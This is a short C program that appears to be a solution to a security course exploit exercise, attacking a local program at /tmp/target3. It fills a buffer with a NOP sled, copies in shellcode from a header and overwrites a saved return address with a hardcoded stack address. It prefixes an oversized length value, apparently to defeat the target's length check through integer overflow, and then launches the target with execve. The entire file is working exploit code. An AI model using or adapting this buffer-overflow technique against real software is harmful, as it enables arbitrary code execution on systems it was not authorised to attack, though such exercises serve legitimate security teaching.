#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];
  char buf[241*20];

// reset memory and add padding
  memset(buf, NOP, 241*20);

// copy shellcode
  strncpy(buf+(235*20), shellcode, strlen(shellcode));

// New eip address
  strncpy(buf+(240*20)+15, "\x40\xdc\xff\xbf", 4);
// length specified as input to the target
  strncpy(buf, "2147483889,", 11);

  
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
